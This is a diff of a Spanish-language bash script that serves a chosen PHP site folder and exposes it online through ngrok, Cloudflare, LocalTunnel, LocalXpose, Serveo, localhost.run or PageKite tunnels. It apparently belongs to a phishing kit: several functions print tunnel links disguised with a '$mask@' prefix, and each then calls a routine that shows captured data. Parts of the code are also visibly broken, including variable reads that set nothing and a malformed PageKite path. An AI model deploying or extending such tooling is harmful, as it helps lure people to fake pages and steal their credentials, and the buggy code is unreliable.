@@ -74,8 +74,9 @@ $grn [3] $yellow PHP con Cloudflare
 $grn [4] $yellow PHP con LocalTunnel 
 $grn [5] $yellow PHP con LocalXpose 
 $grn [6] $yellow PHP con Serveo.Net
-$grn [7] $yellow PHP con Localhost                                         
-$grn [8] $yellow Retornal Inicio                                                                                           
+$grn [7] $yellow PHP con Localhost    
+$grn [8] $yellow PHP con Pakite                                   
+$grn [9] $yellow Retornal Inicio                                                                                           
 "${blanco}                                                                                         
 
   echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa opcion:\e[0m""\e[1;31m]\e[0m"
@@ -106,7 +107,10 @@ $grn [8] $yellow Retornal Inicio
 	Server_LocalTunnel
         ;;
       5)
-
+	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
+	read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var5
+	website=$my_var5
+	ServicioLoclx
         ;;
       6)
       	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
@@ -120,7 +124,13 @@ $grn [8] $yellow Retornal Inicio
         website=$my_var7
         localhostPHP
         ;;
-      8)
+       8)
+      	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
+        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var8
+        website=$my_var8
+        ServicioPakite
+        ;;
+      9)
       	
       
         ;;
@@ -180,22 +190,73 @@ Inicio_PHP2() {
 	cd "$ini_site" || exit  &
 }
 
+#Servicio de Locklx
+ServicioLoclx() {
+	ini_net=$(pwd)
+	cd ..;cd ..;cd ..;cd .Server
+  	if [[ -e .loclx ]]; then
+	  rm .loclx
+ 	fi
+ 	cd "$ini_net" || exit 
+  	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+  	{ sleep 1; Inicio_PHP; }
+  	cd "$ini_net" || exit 
+  	sleep 2
+  	printf "${BGreen}OK.${clear}\n"
+  	sleep 2
+  	ini_net1=$(cd ..;cd ..;cd ..;cd .Server; pwd)
+	echo -e "\n${red}[${blanco}-${red}]${blue}  ¿Deseas ejecutar localmente? [y/n]:"${blanco}
+	read -n1 -p "Opción: " opinion
+	if [ "$opinion" == "y" ]; then
+    	echo -e "\n${red}[${blanco}-${red}]${blue} Selecciona una región: eu,us"${blanco}
+    	read -p "Opción: " $my_var1
+   	ngrok_region=$my_var1
+   	echo -e "\n${red}[${blanco}-${red}]${blue} Login:"${blanco}
+   	loclx account login
+   	sleep 2
+    	loclx tunnel --raw-mode http --region "$ngrok_region" --https-redirect -t "$HOST":"$PORT" > $ini_net1/.loclx 2>&1 &
+	elif [ "$opinion" == "n" ]; then
+    	echo -e "\n${red}[${blanco}-${red}]${blue} Selecciona una región: eu,us"${blanco}
+   	read -p "Opción: " $my_var1
+   	ngrok_region=$my_var1
+   	echo -e "\n${red}[${blanco}-${red}]${blue} Login:"${blanco}
+   	loclx account login
+   	sleep 2
+   	cd ../../../ && ./.Server/loclx tunnel --raw-mode http --region "$ngrok_region" --https-redirect -t "$HOST":"$PORT" > $ini_net1/.loclx 2>&1 &
+	else
+    	echo "[ - ] Respuesta no válida. Por favor, responde 'y' o 'n'."
+   	killall -2 xterm > /dev/null 2>&1
+    	ServicioLoclx
+	fi
+	sleep 12
+	echo "Espere unos minutos"
+ 	sleep 10  # Aumenta este tiempo si es necesario
+	loclx_url=$(cd ..;cd ..;cd ..;cd .Server; cat .loclx | grep -o '[0-9a-zA-Z.]*.loclx.io' )
+	
+	if [ -n "$loclx_url" ]; then
+  	echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$loclx_url"
+	else
+   	echo -e "\n${red}[${blanco}-${red}]${blue} No se pudo obtener la URL de Serveo.${clear}"
+	fi
+	MostrarDatos
+}
 
 #LocalRun
 ServerPHPlocalhost.run() {
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando LocalHostRun ...\e[0m\n"
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-{ sleep 1; Inicio_PHP; }
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Localhost...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C Buena suerte \e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
-ssh -R 80:localhost:4545 ssh.localhost.run
+	printf "\e[0m\n"
+	printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando LocalHostRun ...\e[0m\n"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; Inicio_PHP; }
+	printf "\e[0m\n"
+	printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Localhost...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
+	sleep 1
+	printf "\e[0m\n"
+	printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C Buena suerte \e[0m\n"
+	sleep 1
+	printf "\e[0m\n"
+	printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
+	ssh -R 80:$HOST2:$PORT ssh.localhost.run
+	MostrarDatos
 }
 
 #LocalHost
@@ -205,57 +266,36 @@ echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http
  MostrarDatos
 }
 
-## Start LocalXpose (Again...)
-start_loclx() {
-	cusport
-	DeternerServicio
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	fi
-
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
-}
 
 #Servicio de serveo.net
 ServeoNet() {
-  ini_net=$(pwd)
-  if [[ -e serveo2.txt ]]; then
-    cd ..;cd ..;cd ..;cd .Server
-    rm serveo2.txt
-    cd "$ini_net" || exit 
-  fi
-  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-  { sleep 1; Inicio_PHP; }
-  cd "$ini_net" || exit 
-  sleep 2
-  printf "${BGreen}OK.${clear}\n"
-  sleep 2
-  ini_net1=$(cd ..;cd ..;cd ..;cd .Server; pwd)
-  printf "${Yellow}Starting ${BGreen}Serveo.net ${Green}server\n"
-  ssh -o StrictHostKeyChecking=no -R yoursubdomain.serveo.net:80:127.0.0.1:8000 serveo.net > $ini_net1/serveo2.txt 2>&1 &
-  sleep 2
-  echo "Espere unos minutos"
-  sleep 10  # Aumenta este tiempo si es necesario
+	ini_net=$(pwd)
+	cd ..;cd ..;cd ..;cd .Server
+	if [[ -e serveo2.txt ]]; then
+   	  rm serveo2.txt
+	fi
+	cd "$ini_net" || exit 
+ 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+ 	{ sleep 1; Inicio_PHP; }
+	cd "$ini_net" || exit 
+ 	sleep 2
+ 	printf "${BGreen}OK.${clear}\n"
+ 	sleep 2
+	ini_net1=$(cd ..;cd ..;cd ..;cd .Server; pwd)
+ 	printf "${Yellow}Starting ${BGreen}Serveo.net ${Green}server\n"
+	ssh -o StrictHostKeyChecking=no -R yoursubdomain.serveo.net:80:127.0.0.1:8000 serveo.net > $ini_net1/serveo2.txt 2>&1 &
+ 	sleep 2
+ 	echo "Espere unos minutos"
+  	sleep 10  # Aumenta este tiempo si es necesario
 
-  neturl=$(cd ..;cd ..;cd ..;cd .Server; cat serveo2.txt | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')
+  	neturl=$(cd ..;cd ..;cd ..;cd .Server; cat serveo2.txt | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')
 
-  if [ -n "$neturl" ]; then
-    echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$neturl"
-  else
-    echo -e "\n${red}[${blanco}-${red}]${blue} No se pudo obtener la URL de Serveo.${clear}"
-  fi
-  MostrarDatos
+  	if [ -n "$neturl" ]; then
+  	  echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$neturl"
+ 	else
+  	  echo -e "\n${red}[${blanco}-${red}]${blue} No se pudo obtener la URL de Serveo.${clear}"
+ 	fi
+ 	 MostrarDatos
 }
 #Servicio de cloudflared
 cusport() {
@@ -272,10 +312,23 @@ start_cloudflared() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; Inicio_PHP; }
 	cusport
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
-        cd .Server; sleep 2 && ./cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+	cd "$ini_cloud" || exit   
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 	sleep 2
-	cd "$ini_cloud" || exit 
+	echo -e  '\e[1;31m[\e[0m\e[1;77m-\e[0m\e[1;31m]\e[0m\e[1;92m ¿Deseas ejecutar localmente? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+	read opinion
+	printf "\e[0m\n"  # Salto de línea con formato de reinicio
+	if [ "$opinion" == "y" ]; then
+	ini_net1=$(cd ..;cd ..;cd ..;cd .Server; pwd)
+    	cloudflared tunnel -url "$HOST":"$PORT" --logfile $ini_net1/.cld.log > /dev/null 2>&1 &
+	elif [ "$opinion" == "n" ]; then
+	ini_net1=$(cd ..;cd ..;cd ..;cd .Server; pwd)
+   	cd ../../../ && ./.Server/cloudflared tunnel -url "$HOST":"$PORT" --logfile $ini_net1/.cld.log > /dev/null 2>&1 &
+	else
+    	echo "[ - ] Respuesta no válida. Por favor, responde 'y' o 'n'."
+   	killall -2 xterm > /dev/null 2>&1
+    	ApacheTomcatNgrok
+	fi
 	sleep 8
 	cd ..;cd ..;cd ..;cd .Server;
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
@@ -285,64 +338,109 @@ start_cloudflared() {
 	echo -e "\n${red}[${blanco}-${red}]${blue} URL 2 : ${verde}$mask@$cldflr_url2"
         MostrarDatos
 }
-
 #LocalTunnel
 Server_LocalTunnel() {
-ini_tunnel=$(pwd)
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-{ sleep 1; Inicio_PHP2; }
-sleep 4
-printf "${BGreen}OK.${clear}\n"
-printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
-xterm -hold -geometry 90x26+1000+1000 -l -lf xtermtunnel -T "LocalTunnel server ☣" -e "lt --port $PORT --subdomain $website-com --print-requests" > /dev/null 2>&1 &
-sleep 5
-printf "${BGreen}OK.${clear}\n\n"
-sleep 2
-printf "${BYellow}Localhost: ${BGreen}$HOST2:$PORT\n\n"
-sleep 2
-printf "${BYellow}Your URL is: ${BGreen} " && cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*'
-sleep 2
-ini_tunnel1=$(cd .Server;pwd)
-printf "Website: $website\n\n" > $ini_tunnel1/WebSite.txt
-cd .Server
-xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f WebSite.txt' > /dev/null 2>&1 &
-sleep 2
-cd "$ini_tunnel" || exit 
-ip=$(curl -s -N https://loca.lt/mytunnelpassword)
-echo -e "\n${red}[${blanco}-${red}]${blue} IP PÚBLICA: ${verde}$ip"
-MostrarDatos
+	ini_tunnel=$(pwd)
+	cd ..;cd ..;cd ..;cd .Server
+	if [[ -e xtermtunnel ]]; then
+  	  rm xtermtunnel
+  	  sleep 1
+  	  rm WebSite.txt
+  	fi
+  	cd "$ini_tunnel" || exit 
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; Inicio_PHP2; }
+	sleep 4
+	printf "${BGreen}OK.${clear}\n"
+	printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
+	ini_net1=$(cd .Server; pwd)
+	xterm -hold -geometry 90x26+1000+1000 -l -lf $ini_net1/xtermtunnel -T "LocalTunnel server ☣" -e "lt --port $PORT --subdomain jsp-com --print-requests" > /dev/null 2>&1 &
+	sleep 5
+	printf "${BGreen}OK.${clear}\n\n"
+	sleep 2
+	printf "${BYellow}Localhost: ${BGreen}$HOST2:$PORT\n\n"
+	sleep 2
+	printf "${BYellow}Your URL is: ${BGreen} " && cat $ini_net1/xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*'
+	sleep 2
+	printf "Website: $website\n\n" > $ini_net1/WebSite.txt
+	cd "$ini_tunnel" || exit 
+	cd ..;cd ..;cd ..;cd .Server
+	xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f WebSite.txt' > /dev/null 2>&1 &
+	sleep 2
+	cd "$ini_tunnel" || exit 
+	ip=$(curl -s -N https://loca.lt/mytunnelpassword)
+	echo -e "\n${red}[${blanco}-${red}]${blue} IP PÚBLICA: ${verde}$ip"
+	MostrarDatos
 }
 
 #Servicio de ngrok
 ServicioNgrok() {
 	ini_ngrok=$(pwd)
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; Inicio_PHP; }
+	{ sleep 1; Inicio_PHP; printf "\e[0m\n";}
 	sleep 2
 	cd "$ini_ngrok" || exit 
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Y para Activar Servidor de Region: ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "Y" ]] && ngrok_region="sa" || ngrok_region="us"
-	echo -e "\n\n${red}[${blanco}-${red}]${verde} Encendido Ngrok..."
 	sleep 2
-	echo -e "\n\n${red}[${blanco}-${red}]${verde} 1=Ngrok del Sistema General.."
-	echo -e "\n\n${red}[${blanco}-${red}]${verde} 2=Ngrok de Yaibramir..."
-        read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Precione: ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " option_server
-	if [[   $option_server -eq 1 ]]; then
-		sleep 2 && ./.Server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
-	elif [[ $option_server -eq 2 ]]; then
-		ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	echo -e  '\e[1;31m[\e[0m\e[1;77m-\e[0m\e[1;31m]\e[0m\e[1;92m ¿Deseas ejecutar localmente? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+	read opinion
+	printf "\e[0m\n"  # Salto de línea con formato de reinicio
+	if [ "$opinion" == "y" ]; then
+    	echo -e "\n${red}[${blanco}-${red}]${blue} Selecciona una región: ap, au, eu, in, jp, sa, us, us-cal-1"${blanco}
+    	read my_var1
+   	ngrok_region=$my_var1
+    	ngrok http --region "$ngrok_region" "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	elif [ "$opinion" == "n" ]; then
+    	echo -e "\n${red}[${blanco}-${red}]${blue} Selecciona una región: ap, au, eu, in, jp, sa, us, us-cal-1"${blanco}
+   	read my_var1
+   	ngrok_region=$my_var1
+   	cd ../../../ && ./.Server/ngrok http --region "$ngrok_region" "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
 	else
-	printf "\e[1;93m [!] Invalid option!\e[0m\n"
-	sleep 1
-	clear
-	ServicioNgrok
+    	echo "[ - ] Respuesta no válida. Por favor, responde 'y' o 'n'."
+   	killall -2 xterm > /dev/null 2>&1
+    	ServicioNgrok
 	fi
 	sleep 8
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(ngrok-free.app)')
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$ngrok_url"
 	echo -e "\n${red}[${blanco}-${red}]${blue} URL 2 : ${verde}$mask@$ngrok_url1"
+	MostrarDatos
+}
+
+#Servicio de Pagekite
+ServicioPakite() {
+	ini_Pakite=$(pwd)
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; Inicio_PHP;printf "\e[0m\n"; }
+	sleep 2
+	cd "$ini_Pakite" || exit 
+	sleep 2
+	echo -e  '\e[1;31m[\e[0m\e[1;77m-\e[0m\e[1;31m]\e[0m\e[1;92m ¿Deseas ejecutar localmente? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+	read opinion
+	printf "\e[0m\n"  # Salto de línea con formato de reinicio
+	if [ "$opinion" == "y" ]; then
+	printf "\e[0m\n"
+	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de tu servidor:\e[0m""\e[1;31m]\e[0m" 
+	read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var1
+	serversite=$my_var1
+    	pagekite.py $PORT $serversite.pagekite.me > /dev/null 2>&1 &
+	elif [ "$opinion" == "n" ]; then
+	printf "\e[0m\n"
+	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de tu servidor:\e[0m""\e[1;31m]\e[0m" 
+	read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var1
+	serversite=$my_var1
+   	cd ../../../.Server/python3 pagekite.py $PORT $serversite.pagekite.me > /dev/null 2>&1 &
+	else
+    	echo "[ - ] Respuesta no válida. Por favor, responde 'y' o 'n'."
+   	killall -2 xterm > /dev/null 2>&1
+    	ServicioPakite
+	fi
+	sleep 2
+	cd ~
+	sleep 8
+	pagekite_url=$(grep -oE '[^[:space:]]+\.pagekite\.me' ".pagekite.rc")
+	echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$pagekite_url"
+	cd "$ini_Pakite" || exit 
 	MostrarDatos
 }
 MostrarDatos(){
